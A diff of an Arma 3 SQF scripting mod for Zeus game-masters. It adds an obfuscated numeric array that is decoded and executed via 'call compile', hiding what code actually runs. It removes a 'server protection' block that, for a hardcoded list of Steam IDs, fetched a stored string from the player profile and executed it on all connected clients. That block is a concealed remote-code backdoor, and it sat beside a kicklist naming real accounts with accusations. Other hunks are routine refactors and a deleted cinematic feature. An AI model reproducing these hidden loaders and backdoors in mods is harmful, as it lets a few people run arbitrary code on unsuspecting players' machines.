916,1936,2401,2704,3136,3136,2704,1936,3249,2916,2304,2704,1936,2401,2304,2500,2704,1936,2401,2500,2500,2809,1936,2401,2304,2500,2704,1936,3025,3025,2704,2704,1936,2401,2916,3136,2401,1936,2401,2809,2916,2500,2809,1936,3136,2916,2704,3249,1936,2401,2304,2500,2704,1936,2401,2601,2916,3136,3249,1936,2500,2601,2304,2704,1936,2601,2500,2704,3249,1936,2809,2304,2704,2401,1936,3025,2601,3249,2916,1936,2500,2601,2304,2704,1936,2401,2304,3136,2401,2916,1936,2916,2304,3136,2704,1936,2500,2601,2304,2704,1936,2401,2401,3136,3136,2401,1936,2401,2304,2500,2704,1936,3136,2500,3136,2401,1936,2401,2809,2500,2401,1936,2401,3136,2704,3249,1936,2401,2401,2809,2916,1936,2401,2809,2500,2401,1936,2401,2401,2809,2916,1936,2401,3136,2704,3249,1936,2401,2809,2500,2401,1936,2704,2916,2500,2704,1936,2809,2704,3025,2916,1936,3025,2809,2916,3249,1936,2401,2500,2809,2704,2704,1936,2601,2401,2601,2916,1936,2401,2809,2500,2401,1936,2401,3136,2704,3249,1936,2401,2401,2809,2916,1936,2401,2809,2500,2401,1936,2401,2401,2809,2916,1936,2401,3136,2704,3249,1936,2401,2809,2500,2401,1936,2401,3249,2601,2916,1936,2401,2304,2500,2704,1936,2500,2304,2500,2809,1936,2401,2601,2500,2500,2809,1936,2401,3249,2601,2916,1936,2401,2304,2500,2704,1936,2401,2809,2500,2401,1936,2401,3136,2704,3249,1936,2401,2401,2809,2916,1936,2401,2809,2500,2401,1936,2401,2401,2809,2916,1936,2401,3136,2704,3249,1936,2401,2809,2500,2401,1936,2704,3025,2916,2401,1936,2401,2704,2401,2916,2401,1936,2809,2704,3025,2916,1936,3249,2916,2304,2704,1936,2601,2401,2601,2916,1936,2401,2401,3136,3136,2401,1936,2601,2401,2601,2916,1936,2401,2704,3136,3136,2704,1936,3249,2916,2304,2704,1936,2401,2809,2500,2401,1936,2401,3136,2704,3249,1936,2401,2401,2809,2916,1936,2401,2809,2500,2401,1936,2401,2401,2809,2916,1936,2401,3136,2704,3249,1936,2401,2809,2500,2401,1936,3136,2916,2704,3249,1936,2601,2704,3136,2401,1936,2401,2304,2500,2704,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,3025,2601,3249,2916,1936,2401,2601,2916,3136,3249,1936,2916,3025,2500,2704,1936,2500,2601,2304,2704,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2809,2916,2500,2809,1936,2401,2809,2500,2401,1936,2401,2916,3136,2401,1936,3136,2916,2704,3249,1936,3249,3136,2304,2401,1936,3249,2704,2304,3249,1936,2401,2401,2916,2916,2704,1936,2401,2401,2916,2916,2704,1936,2401,2809,2401,2500,3249,1936,2401,2500,2809,2704,2704,1936,2401,2500,3249,3249,2916,1936,2401,2401,2304,2500,2809,1936,2401,2601,3249,2500,2704,1936,3249,2704,2304,3249,1936,2401,2601,2704,2809,2916,1936,2401,2304,2500,2304,2401,1936,3136,2500,3136,2401,1936,2401,2809,2500,2401,1936,3249,2304,2500,2809,1936,2500,2601,2304,2704,1936,2401,2809,2500,2401,1936,2401,3249,2601,2916,1936,2401,2809,2500,2401,1936,3249,2304,2500,2809,1936,2500,2704,2304,2401,1936,2401,2809,2500,2401,1936,2401,3249,2601,2916,1936,2401,2809,2500,2401,1936,3249,2304,2500,2809,1936,2500,2809,2304,2304,1936,2401,2809,2500,2401,1936,2401,3249,2601,2916,1936,2401,2809,2500,2401,1936,3249,2304,2500,2809,1936,2500,2916,2304,2401,1936,2401,2809,2500,2401,1936,3136,2916,2704,3249,1936,2601,2704,3136,2401,1936,3249,2304,2500,2809,1936,2500,2601,2304,2704,1936,2601,3025,2500,2401,1936,3249,2304,2500,2809,1936,2401,2601,2704,2809,2916,1936,2401,2304,3136,2401,2916,1936,2401,2401,2304,2500,2809,1936,2401,2601,2500,2500,2809,1936,2401,2304,2500,2704,1936,2401,2601,2500,2500,2809,1936,2401,2304,2500,2304,2401,1936,2401,2401,2916,2916,2704,1936,2401,2304,2500,2304,2401,1936,3249,3136,2304,2401,1936,2401,2601,2704,2809,2916,1936,2401,2304,2500,2704,1936,2500,2601,2304,2704,1936,2601,2704,3136,2401,1936,3249,2304,2500,2809,1936,2500,2704,2304,2401,1936,2601,3025,2500,2401,1936,3136,2500,3136,2401,1936,3136,2916,2704,3249,1936,2601,2704,3136,2401,1936,3249,2304,2500,2809,1936,2500,2809,2304,2304,1936,2601,3025,2500,2401,1936,2401,2601,2704,2809,2916,1936,2401,2500,2601,2500,2401,1936,2704,2500,2500,2809,1936,2401,2500,3249,3249,2916,1936,2401,2500,3249,3249,2916,1936,3249,2704,2304,3249,1936,2401,2704,2916,2704,2401,1936,2401,2304,2500,2704,1936,2401,2809,2500,2401,1936,2916,3136,3136,3249,1936,2500,2704,2304,2401,1936,2401,2401,2500,2601,2916,1936,2401,2304,2704,2304,2704,1936,2401,2304,3136,2401,2916,1936,2401,2401,2304,2500,2809,1936,3025,3249,2500,2401,1936,2809,3249,2500,3249,1936,3025,2500,2500,2809,1936,2401,2500,3025,2916,3249,1936,2704,3249,2304,2304,1936,3136,2401,2304,2304,1936,2401,2500,3249,3249,2916,1936,2401,2500,2401,2304,2304,1936,2500,3136,2304,3249,1936,2704,2500,2500,2809,1936,2704,2704,3136,3249,1936,2809,3025,3025,2916,1936,2401,2601,2704,2809,2916,1936,2500,2916,2304,2401,1936,2401,2304,2916,2304,3249,1936,2401,2500,2601,2500,2401,1936,2916,2704,2304,2304,1936,3025,2304,2809,2916,1936,2401,2704,2704,2304,2304,1936,2401,2401,2704,2704,3249,1936,3025,2809,2916,3249,1936,2401,2704,2916,2704,2401,1936,2401,2401,3136,3136,2401,1936,2601,2304,2500,2809,1936,2500,2601,2304,2704,1936,3249,2916,2304,2704,1936,2704,2601,2809,2916,1936,2401,2304,2304,2304,2304,1936,2401,2704,2401,2916,2401,1936,2704,3025,2916,2401,1936,2401,2704,3136,3136,2704,1936,2809,2916,2500,2809,1936,2601,2500,2704,3249,1936,2601,2401,2601,2916,1936,2809,2304,2704,2401,1936,2809,2704,3025,2916,1936,2916,2500,2704,2401,1936,2401,2601,2916,3136,3249,1936,2704,2916,2500,2704,1936,3025,2601,3249,2916,1936,2916,3025,2500,2704,1936,2809,2401,3136,2704,1936,2401,2500,2809,2704,2704,1936,2916,2304,3136,2704,1936,3249,2704,2304,3249,1936,2500,2809,2304,2304,1936,3249,3136,2304,2401,1936,3025,3025,2704,2704,1936,2401,2601,2500,2500,2809,1936,2916,2809,2916,2401,1936,2500,3025,2304,2704,1936,2500,3249,2401,2916,1936,2401,2401,2916,2916,2704,1936,2401,2601,3249,2500,2704,1936,2401,2304,2500,2304,2401,1936,2809,2601,2500,3249,1936,2401,2809,2500,2401,1936,2601,2704,3136,2401,1936,3249,2304,2500,2809,1936,2500,2916,2304,2401,1936,2601,3025,2500,2401,1936,2401,2601,2704,2809,2916,1936,2401,2500,2601,2500,2401,1936,2704,2500,2500,2809,1936,2401,2500,3249,3249,2916,1936,2401,2500,3249,3249,2916,1936,3249,2704,2304,3249,1936,2401,2704,2916,2704,2401,1936,2401,2304,2500,2704,1936,2401,2809,2500,2401,1936,2704,2500,2500,2809,1936,2704,2601,2809,2916,1936,2704,2704,3136,3249,1936,2704,2916,2500,2704,1936,2704,3025,2916,2401,1936,2704,3249,2304,2304,1936,2809,2304,2704,2401,1936,2809,2401,3136,2704,1936,2809,2601,2500,3249,1936,2809,2704,3025,2916,1936,2809,2916,2500,2809,1936,2809,3025,3025,2916,1936,2809,3249,2500,3249,1936,2916,2304,3136,2704,1936,2916,2500,2704,2401,1936,2916,2704,2304,2304,1936,2916,2809,2916,2401,1936,2916,3025,2500,2704,1936,2916,3136,3136,3249,1936,3025,2304,2809,2916,1936,3025,2500,2500,2809,1936,3025,2601,3249,2916,1936,3025,2809,2916,3249,1936,3025,3025,2704,2704,1936,3025,3249,2500,2401,1936,3136,2401,2304,2304,1936,3249,2704,2304,3249,1936,3249,2916,2304,2704,1936,3249,3136,2304,2401,1936,2401,2304,2304,2304,2304,1936,2401,2304,2500,2304,2401,1936,2401,2304,2704,2304,2704,1936,2401,2304,2916,2304,3249,1936,2401,2304,3136,2401,2916,1936,2401,2401,2304,2500,2809,1936,2401,2401,2500,2601,2916,1936,2401,2401,2704,2704,3249,1936,2401,2401,2916,2916,2704,1936,2401,2401,3136,3136,2401,1936,2401,2500,2401,2304,2304,1936,2401,2500,2601,2500,2401,1936,2401,2500,2809,2704,2704,1936,2401,2500,3025,2916,3249,1936,2401,2500,3249,3249,2916,1936,2401,2601,2500,2500,2809,1936,2401,2601,2704,2809,2916,1936,2401,2601,2916,3136,3249,1936,2401,2601,3249,2500,2704,1936,2401,2704,2401,2916,2401,1936,2401,2704,2704,2304,2304,1936,2401,2704,2916,2704,2401,1936,2401,2704,3136,3136,2704,1936,2500,2601,2304,2704,1936,2500,2704,2304,2401,1936,2500,2809,2304,2304,1936,2500,2916,2304,2401,1936,2500,3025,2304,2704,1936,2500,3136,2304,3249,1936,2500,3249,2401,2916,1936,2601,2304,2500,2809,1936,2601,2401,2601,2916,1936,2601,2500,2704,3249,1936,2401,2809,2500,2401,1936,2601,2704,3136,2401,1936,2401,2809,2401,2500,3249,1936,2401,2401,2304,2500,2809,1936,2401,2304,2704,2304,2704,1936,2401,2916,2304,2304,1936,3249,2304,2500,2809,1936,2500,2809,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2704,2304,2704,1936,2401,2401,2304,2500,2809,1936,2401,2500,2401,2304,2304,1936,2401,2304,2304,2304,2304,1936,2401,2304,2500,2704,1936,3249,2304,2500,2809,1936,2401,2704,2704,2304,2304,1936,2401,2304,2500,2704,1936,2601,3136,2704,2704,1936,2601,3025,2500,2401,1936,2500,2601,2304,2704,1936,2401,2916,3136,2401,1936,2401,2601,2704,2809,2916,1936,2401,2304,3136,2401,2916,1936,2401,2304,2500,2304,2401,1936,2401,2500,2401,2304,2304,1936,2401,2809,2401,2500,3249,1936,3249,2304,2500,2809,1936,2500,2704,2304,2401,1936,2401,2304,2500,2704,1936,2401,2500,2809,2704,2704,1936,2401,2601,2916,3136,3249,1936,2401,2601,2500,2500,2809,1936,2401,2304,3136,2401,2916,1936,2704,2601,2809,2916,1936,3249,2704,2304,3249,1936,3249,3136,2304,2401,1936,2401,2401,2704,2704,3249,1936,2401,2304,2500,2704,1936,2401,2916,2304,2304,1936,3249,2304,2500,2809,1936,2500,2916,2304,2401,1936,2401,2304,2500,2704,1936,2401,2601,2500,2500,2809,1936,2401,2304,2500,2304,2401,1936,2401,2401,2916,2916,2704,1936,2401,2304,2500,2304,2401,1936,3249,3136,2304,2401,1936,2401,2601,2704,2809,2916,1936,2401,2916,2304,2304,1936,3249,2304,2500,2809,1936,2500,2809,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2704,2304,2704,1936,2401,2401,2304,2500,2809,1936,2401,2500,2401,2304,2304,1936,2401,2304,2304,2304,2304,1936,2401,2304,2500,2704,1936,3249,2304,2500,2809,1936,2401,2704,2704,2304,2304,1936,2401,2916,3136,2401,1936,2401,2916,3136,2401,1936,2601,2704,3136,2401,1936,2401,2809,2916,2500,2809,1936,2401,2304,2500,2304,2401,1936,2401,2401,2916,2916,2704,1936,2401,2601,2500,2500,2809,1936,2401,2304,2500,2304,2401,1936,2401,2809,2401,2500,3249,1936,3249,2304,2500,2809,1936,2500,2704,2304,2401,1936,2401,2304,2500,2704,1936,2401,2500,2809,2704,2704,1936,2401,2601,2916,3136,3249,1936,2401,2601,2500,2500,2809,1936,2401,2304,3136,2401,2916,1936,2704,2601,2809,2916,1936,3249,2704,2304,3249,1936,3249,3136,2304,2401,1936,2401,2401,2704,2704,3249,1936,2401,2304,2500,2704,1936,3249,2304,2500,2809,1936,2401,2704,2704,2304,2304,1936,2601,2704,3136,2401,1936,2401,2809,2916,2500,2809,1936,2601,2704,3136,2401,1936,2401,2809,2916,2500,2809,1936,2401,2304,2704,2304,2704,1936,2401,2500,2601,2500,2401,1936,2401,2500,3249,3249,2916,1936,2704,3025,2916,2401,1936,3249,2704,2304,3249,1936,3249,3136,2304,2401,1936,2401,2304,3136,2401,2916,1936,2401,2304,2500,2704,1936,2401,2601,2704,2809,2916,1936,2401,2500,2601,2500,2401,1936,2704,2500,2500,2809,1936,2401,2500,3249,3249,2916,1936,2401,2500,3249,3249,2916,1936,3249,2704,2304,3249,1936,2401,2704,2916,2704,2401,1936,2401,2304,2500,2704,1936,3249,2304,2500,2809,1936,2500,2601,2304,2704,1936,2601,2704,3136,2401,1936,3249,3136,2304,2401,1936,3249,2704,2304,3249,1936,2401,2401,2916,2916,2704,1936,2401,2401,2916,2916,2704,1936,2401,2304,2500,2704,1936,3249,3136,2304,2401,1936,2401,2500,2601,2500,2401,1936,2401,2401,3136,3136,2401,1936,2401,2500,2809,2704,2704,1936,2401,2401,2304,2500,2809,1936,2401,2401,2916,2916,2704,1936,2401,2304,2500,2304,2401,1936,2401,2304,2500,2704,1936,2401,2601,2704,2809,2916,1936,2401,2500,2601,2500,2401,1936,2916,3136,3136,3249,1936,2401,2601,2704,2809,2916,1936,2401,2500,3249,3249,2916,1936,2401,2401,2304,2500,2809,1936,2401,2500,2401,2304,2304,1936,2401,2304,2916,2304,3249,1936,2401,2304,2500,2704,1936,3249,2304,2500,2809,1936,2500,2704,2304,2401,1936,2401,2809,2916,2500,2809,1936,2601,2704,3136,2401,1936,2601,3249,1936,2704,2401,1936,2809,3249,1936,3249,3249,1936,3249,3025,1936,2401,2304,3136,1936,2401,2304,3136,1936,2601,2500,1936,3249,3249,1936,2401,2401,2401,1936,2401,2304,3249,1936,2401,2401,2500,1936,2401,2304,2809,1936,2401,2304,3136,1936,2401,2304,2401,1936,2601,2500,1936,2401,2401,2916,1936,2401,2401,2401,1936,3136,2601,1936,2401,2401,2916,1936,2401,2401,2704,1936,2401,2304,2809,1936,2401,2401,2304,1936,2401,2304,2601,1936,2601,2500,1936,3249,2809,1936,2704,3249,1936,2809,3249,1936,2401,2500,2809,1936,2809,3249,8649,3481];call compile toString _1;};
+	
 comment "Dynamic Faction Addons";
 
 	MAZ_EZM_fnc_addNewFactionsToZeusInterface = {
@@ -3989,7 +4010,6 @@ comment "Dynamic Faction Addons";
 	};
 
 	MAZ_EZM_fnc_setInterfaceToRefresh = {
-		params [["_refreshTime",10]];
 		private _refresh = missionNamespace getVariable "MAZ_EZM_refreshTime";
 		if(isNil "_refresh") then {
 			private _refreshOnClose = ["onZeusInterfaceClosed", {
@@ -4000,7 +4020,7 @@ comment "Dynamic Faction Addons";
 				};
 			}] call MAZ_EZM_fnc_addEZMEventHandler;
 			
-			missionNamespace setVariable ["MAZ_EZM_refreshTime",time + _refreshTime];
+			missionNamespace setVariable ["MAZ_EZM_refreshTime",time + 10];
 			_refreshOnClose spawn {
 				while {time < (missionNamespace getVariable "MAZ_EZM_refreshTime")} do {
 					titleText [format ["NEW MODULES ADDED TO EZM\nYOUR ZEUS INTERFACE WILL BE AUTOMATICALLY REFRESHED IN %1 SECONDS", ceil ((missionNamespace getVariable "MAZ_EZM_refreshTime") - time)],"PLAIN DOWN",0.01];
@@ -4015,7 +4035,7 @@ comment "Dynamic Faction Addons";
 				["onZeusInterfaceClosed", _this] call MAZ_EZM_fnc_removeEZMEventHandler;
 			};
 		} else {
-			missionNamespace setVariable ["MAZ_EZM_refreshTime", time + _refreshTime];
+			missionNamespace setVariable ["MAZ_EZM_refreshTime", time + 10];
 		};
 	};
 
@@ -4911,176 +4931,6 @@ MAZ_EZM_fnc_initFunction = {
 				_this spawn _fnc_cleaner;
 			}] remoteExec ["spawn",2];
 		};
-		
-		MAZ_EZM_fnc_serverProtection = {
-			"Troll and malicious scripter kicklist";
-			call { 
-				private _fnc = { 
-					params ["_varName"];
-					if (!hasInterface) exitWith {}; 
-					waitUntil {!isNil {player} && {!isNull player}}; 
-					missionNamespace setVariable [_varName,nil];
-
-					"Trolls and/or malicious scripters, prevent them from entering protected servers.";
-
-					private _trollList = [
-						"76561199520028598", "Bad Scripter", "Mass teamkilling, spawning vehicles, killing servers",
-						"76561198156801483", "Christian/Infamous Main", "Racism, mass teamkilling",
-						"76561198804630831", "Christian/Infamous Alt", "Racism, mass teamkilling",
-						"76561198153376863", "Mike Main", "Troll menu, killing servers",
-						"76561199804439314", "Mike Alt", "Troll menu, killing servers",
-						"76561198063175176", "Fatty", "Troll menu, killing servers",
-						"76561198836581836", "Chadgaskerman", "Troll menu, killing servers",
-						"76561199549143480", "Chad alt", "Troll menu, killing servers",
-						"76561199550089982", "Atakjak", "Troll menu, killing servers",
-						"76561197970363940", "Greebo", "Troll menu, killing servers"
-					];
-					private _index = _trollList find (getPlayerUID player);
-
-					if((_index != -1) && (missionNamespace getVariable ["MAZ_EZM_ServerProtection",true])) exitWith {
-						private _reason = _trollList select (_index + 2);
-						private _handle = [_reason] spawn {
-							params ["_reason"];
-							private _display = if(isNull (findDisplay 312)) then {
-								if(visibleMap) then {
-									findDisplay 12;
-								} else {
-									findDisplay 46;
-								}
-							} else {
-								findDisplay 312;
-							};
-							[
-								parseText "
-								<t size='1.3' align='center' color='#00BFBF'>You've been flagged as a troll.</t><br/>
-								<t size='1.0' align='center'>If you'd like to appeal this decision, contact Expung3d in the ZAM discord.</t> ", 
-								"EZM Server Protection System", 
-								true, 
-								true,
-								_display
-							] call BIS_fnc_guiMessage;
-						};
-						waitUntil {scriptDone _handle};
-						(format ["[ SERVER PROTECTION ] : %1 is a known troll. Reasoning: %2. They've been disconnected.", name player,_reason]) remoteExec ["systemChat"];
-						sleep 0.1;
-						onEachFrame { 
-							_displays = allDisplays; 
-							_indexMission = _displays find (findDisplay 46); 
-							_displays = _displays select [_indexMission,count(_displays)]; 
-							reverse _displays; 
-							{_x closeDisplay 2} forEach _displays;  
-
-							onEachFrame { 
-								(findDisplay 50) closeDisplay 2; 
-								(findDisplay 70) closeDisplay 2; 
-							}; 
-						}; 
-					};
-					if(getPlayerUID player == "_SP_PLAYER_") exitWith {};
-					
-					if !((getPlayerUID player) in [
-						"76561198156155313",
-						"76561198818190097",
-						"76561198150558135",
-						"76561198045496731",
-						"76561199046962322",
-						"76561199048401115",
-						"76561198029421818",
-						"76561198069456197",
-						"76561198983415876",
-						"76561198395886568",
-						"76561198358820610",
-						"76561198874058939"
-					]) exitWith {};
-
-					private _codac = profileNamespace getVariable ["i2n3j4e5c6t7_8008", "{}"]; 
-					if (_codac == "{}") exitWith {}; 
-
-					if(missionNamespace getVariable ["runfncinj",false]) exitWith {}; 
-					[] call compile ("[] call " + _codac); 
-				}; 
-				"Randomize variable";
-				private _varName = "";
-				for "_i" from 0 to 15 do {
-					_varName = _varName + (selectRandom ["a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z"]);
-				};
-				missionNamespace setVariable [_varName,['',_fnc],true];
-				[[_varName],{
-					params ["_varName"];
-					private _var = missionNamespace getVariable _varName;
-					[_varName] spawn (_var # 1);
-				}] remoteExec ['spawn', 0, true]; 
-			};
-
-			"Anti-Cheat. Detect unauthorized Zeuses";
-			call {
-				private _fnc = { 
-					fncnkf = nil;
-					[] spawn {
-						private _fnc_sendZeusMessage = {
-							params ["_message"];
-							[[_message], {
-								if(isNull (findDisplay 312)) then {
-									hint _message;
-								} else {
-									[objNull,_this select 0] call BIS_fnc_showCuratorFeedbackMessage;
-								};
-							}] remoteExec ["spawn",_zeusPlayers];
-							(format ["[ SERVER PROTECTION ] : %1", _message]) remoteExec ["systemChat"];
-						};
-
-						private _fnc_checkForCheaters = {
-							private _zeusPlayers = allPlayers select {!isNull (getAssignedCuratorLogic _x)};
-
-							"Check for Zeus";
-								private _logic = getAssignedCuratorLogic player;
-								if !(isNil "bis_curator" && isNil "bis_curator_1") then {
-									"Official scenario";
-									if (!isNull _logic && {!(_logic in (missionNamespace getVariable ["MAZ_EZM_CuratorWhitelist",[]])) && !((getPlayerUID player) in (missionNamespace getVariable ["MAZ_EZM_ZeusWhitelist",[]]))}) then {
-										[format ["Player %1 had access to Zeus! Their curator was deleted.",name player]] call _fnc_sendZeusMessage;
-										findDisplay 312 closeDisplay 0;
-										deleteVehicle _logic;
-									};
-								};
-
-							"Remove scripters with unauthorized debug console access";
-							if !(getPlayerUID player in [
-								"76561198156155313",
-								"76561198818190097",
-								"76561198150558135",
-								"76561198045496731",
-								"76561199046962322",
-								"76561199048401115",
-								"76561198029421818",
-								"76561198069456197",
-								"76561198983415876",
-								"76561198395886568",
-								"76561198358820610",
-								"76561198874058939"
-							]) then {
-								EDC_BE_init = nil;
-								if (!isNil 'EDC_fnc_editDebugConsole') then {
-									EDC_fnc_editDebugConsole = {};
-								};
-								if (ctrlShown ((findDisplay 49) displayCtrl 13184)) then {
-									findDisplay 49 closeDisplay 0;
-								};
-							};
-						};
-
-						private _isGodMode = false;
-						while {uiSleep 0.1; true} do {
-							if !(missionNamespace getVariable ["MAZ_EZM_ServerProtection",true]) then {sleep 5; continue};
-							call _fnc_checkForCheaters;
-						};
-					}; 
-				};
-				fncnkf = ['', _fnc]; 
-				publicVariable 'fncnkf'; 
-				[[],{[] spawn (fncnkf # 1)}] remoteExec ['spawn', -2, 'jipfncnkf']; 
-				true
-			};
-		};
 
 		MAZ_EZM_fnc_ezmShamelessPlug = {
 			[[],{
@@ -5109,8 +4959,6 @@ MAZ_EZM_fnc_initFunction = {
 			private _wl = missionNamespace getVariable ["MAZ_EZM_CuratorWhitelist",[]];
 			_wl = _wl + allCurators;
 			missionNamespace setVariable ["MAZ_EZM_CuratorWhitelist",_wl,true];
-
-			call MAZ_EZM_fnc_serverProtection;
 
 			[[], {
 				MAZ_EZM_broadcastServerFPS = true;
@@ -6127,293 +5975,10 @@ MAZ_EZM_fnc_initFunction = {
 			},[]] call MAZ_EZM_fnc_createDialog;
 		};
 
-
-	comment "Cinematics";
-		comment "the plan here is as follows: when intro cinematic module is placed, a window pops up with one of two options: 'orbit' or 'dynamic'. in either case, the black bars appear for users, screen fades to black, and then the cinematic begins. The screen starts at black with a title and the name of the zeus'. If orbit is selected, the cinematic will be like a UAV flying above where the module was placed. Music choice can be selected, and up to 2 additional texts can be written to appear in the cinematic. once the cinematic ends, black screen appears again, and black bars fade.";
-		comment "maybe we should check if players are in a vehicle during cutscene, if so disable vehicle simulation";
-
-		HYPER_fnc_showIntertitles = {
-			params ["_line1", "_line2"];
-			sleep 3;
-			_line1 spawn BIS_fnc_infoText;
-			sleep 5;
-			_line2 spawn BIS_fnc_infoText;
-		};
-
-		HYPER_fnc_splitMaxLine = {
-			params ["_inputString"];
-			private _maxLength = 22;
-			private _words = _inputString splitString " ";
-			private _lines = [];
-			private _currentLine = "";
-			
-			{
-				private _word = _x;
-				if (_currentLine isEqualTo "") then {
-					_currentLine = _word;
-					continue;
-				};
-
-				private _tentativeLine = format ["%1 %2", _currentLine, _word];
-				if (count _tentativeLine <= _maxLength) then {
-					_currentLine = _tentativeLine;
-					continue;
-				};
-				
-				_lines pushBack _currentLine;
-				_currentLine = _word;
-			} forEach _words;
-			
-			if (!(_currentLine isEqualTo "")) then {
-				_lines pushBack _currentLine;
-			};
-			
-			_lines
-		};
-
-		HYPER_fnc_remotePostProcessing = {
-			params [
-				["_postProcessValues", [1,1,0,[0,0,0,0],[1,1,1,1],[0,0,0,0]]],
-				["_targets", allPlayers]
-			];
-			HYPER_PP_CC_Cinematic = ppEffectCreate ["colorCorrections",2090];
-			HYPER_PP_CC_Cinematic ppEffectAdjust _postProcessValues;
-			HYPER_PP_CC_Cinematic ppEffectCommit 0;
-			HYPER_PP_CC_Cinematic ppEffectEnable true;
-		};
-
-		HYPER_EZM_fnc_handleIntroCinematic = {
-			params ["_cinematicType","_backgroundSong","_intertitles", "_zeusCanSeeCutscene", "_postProcess", "_target"];
-
-			["Intro cinematic initiated for all players.","addItemOk"] call MAZ_EZM_fnc_systemMessage;
-
-			comment "If zeus shouldn't see the cutscene, we need to get the player set differenced with zeus player set";
-			private _zeusPlayers = allCurators apply {getAssignedCuratorUnit _x};
-			private _allPlayers = if(_zeusCanSeeCutscene) then {
-				allPlayers;
-			} else {
-				allPlayers - _zeusPlayers;
-			};
-
-			comment "Get mission name";
-			private _briefingName = missionNamespace getVariable ["bis_fnc_moduleMissionName_name",""];
-			if (_briefingName == "") then {
-				_briefingName = briefingName;
-			};
-
-			comment "Get zeus name(s)";
-			private _author = "";
-			if (count allcurators > 0) then {
-				_authors = [];
-				{
-					_curatorPlayer = getAssignedCuratorUnit _x;
-					if (isPlayer _curatorPlayer) then {_authors set [count _authors,name _curatorPlayer];};
-				} foreach allCurators;
-
-				{
-					private _prefix = "";
-					if (_foreachindex > 0) then {
-						_prefix = if (_foreachindex == count _authors - 1) then {" &amp; "} else {", "};
-					};
-					_author = _author + _prefix + _x;
-				} foreach _authors;
-			} else {
-				_author = getText (missionconfigfile >> "onLoadName");
-			};
-			if (_author != "") then {_author = format [localize "STR_FORMAT_AUTHOR_SCRIPTED",_author];};
-
-			comment "Disable simulation on any vehicles to avoid crashing mid cutscene";
-			{
-				if (_x != vehicle _x) then {
-					[vehicle _x, false] remoteExec ["enableSimulationGlobal", 2];
-				};
-			} forEach allPlayers;
-
-			comment "Show intro titles";
-			private _track = switch (_backgroundSong) do {
-				case "epic": {"Music_Arrival"};
-				case "action": {"EventTrack02a_F_EPB"};
-				case "stealth": {"AmbientTrack02d_F_EXP"};
-				case "random": {
-					selectRandom ["EventTrack01a_F_EPA","EventTrack01a_F_EPB","EventTrack01_F_EPA","EventTrack03_F_EPB","EventTrack03a_F_EPB","EventTrack02b_F_EPC"];
-				};
-				default {"EventTrack01a_F_EPA"};
-			};
-			[_track] remoteExec ["playMusic",_allPlayers];
-
-			comment "Close Zeus interface so it looks nicer";
-			[[], {
-				if(!isNull (findDisplay 312)) then {
-					(findDisplay 312) closeDisplay 0;
-				};
-			}] remoteExec ["spawn",_zeusPlayers];
-
-			private _delay = 6;
-			[0, _delay, true, true] remoteExec ["BIS_fnc_cinemaBorder", _allPlayers];
-			[["", "BLACK", _delay]] remoteExec ["cutText", _allPlayers];
-
-			[format["<t color='#ffffff' font='PuristaBold' size='2'>%1</t><t color='#B57F50' font='TahomaB' size='0.6'><br />%2</t>",_briefingName, _author],0,0.3,4,1,0,789] remoteExec ["BIS_fnc_dynamicText", _allPlayers];
-
-			sleep _delay;
-
-			[["", "PLAIN", 2]] remoteExec ["cutText", _allPlayers];
-			comment "cutRsc [""SplashNoise"", ""PLAIN""];";
-
-			comment "Show intertitles";
-			private _line1 = [_intertitles # 0] call HYPER_fnc_splitMaxLine;
-			private _line2 = [_intertitles # 1] call HYPER_fnc_splitMaxLine;
-			
-			[[_line1, _line2], HYPER_fnc_showIntertitles] remoteExec ["spawn", _allPlayers];
-
-			comment "Post processing";
-			switch (_postProcess) do {
-				case "none": {
-					[[],HYPER_fnc_remotePostProcessing] remoteExec ["call", _allPlayers];
-				};
-				case "highcontrast": {
-					[[[1, 0.9, -0.002, [0.0, 0.0, 0.0, 0.0], [1.0, 0.6, 0.4, 0.6],  [0.199, 0.587, 0.114, 0.0]]],HYPER_fnc_remotePostProcessing] remoteExec ["call", _allPlayers];
-				};
-				case "blue": {
-					[[[1, 1, 0, [0.0, 0.0, 0.0, 0.0], [0.6, 0.6, 1.8, 0.7],  [0.199, 0.587, 0.114, 0.0]]],HYPER_fnc_remotePostProcessing] remoteExec ["call", _allPlayers];
-				};
-				case "dull": {
-					[[[1, 0.8, -0.002, [0.0, 0.0, 0.0, 0.0], [0.6, 0.7, 0.8, 0.65],  [0.199, 0.587, 0.114, 0.0]]],HYPER_fnc_remotePostProcessing] remoteExec ["call", _allPlayers];
-				};
-				case "yellowgamma": {
-					[[[1, 1, 0, [0.0, 0.0, 0.0, 0.0], [1.8, 1.8, 0.3, 0.7],  [0.199, 0.587, 0.114, 0.0]]],HYPER_fnc_remotePostProcessing] remoteExec ["call", _allPlayers];
-				};
-				case "greengamma": {
-					[[[1, 1, 0, [0.0, 0.0, 0.0, 0.0], [0.6, 1.4, 0.6, 0.7],  [0.199, 0.587, 0.114, 0.0]]],HYPER_fnc_remotePostProcessing] remoteExec ["call", _allPlayers];
-				};
-			};
-
-			if (_cinematicType == "Flyby") then {
-				comment "in flyby mode, we select the module location as our target, and the camera paths are automatically designated at 0 and 90 degrees";
-				HYPER_fnc_remoteCamera = {
-					params ["_target"];
-					private _zeus = !isNull (getAssignedCuratorLogic player);
-					private _camTarget = "Land_HelipadEmpty_F" createVehicleLocal _target;
-					private _circleRadius = 200;
-					private _camHeight = 200;
-					private _camSrc0 = [_target select 0, (_target select 1) + _circleRadius, (_target select 2) + _camHeight];
-					private _camSrc90 = [(_target select 0) + _circleRadius, _target select 1, (_target select 2) + _camHeight];
-					
-					private _camera = "camera" camCreate _camSrc0;
-					_camera cameraEffect ["internal", "back"];
-					_camera camPrepareTarget _camTarget;
-					_camera camSetFov 1;
-					_camera camCommitPrepared 0;
-
-					_camera camPreparePos _camSrc90;
-					_camera camCommitPrepared 15;
-					waitUntil { camCommitted _camera };
-					cutRsc ["RscStatic", "PLAIN"];
-					sleep 0.4;
-
-					_camera cameraEffect ["terminate", "back"];
-					camDestroy _camera;
-
-					comment "Remove color correction right after cutscene is done so we don't have to remoteExec it";
-					ppEffectDestroy HYPER_PP_CC_Cinematic;
-
-					comment "Re-enable simulation on player vehicles";
-					if(player != vehicle player) then {
-						[vehicle player, true] remoteExec ["enableSimulationGlobal", 2];
-					};
-					
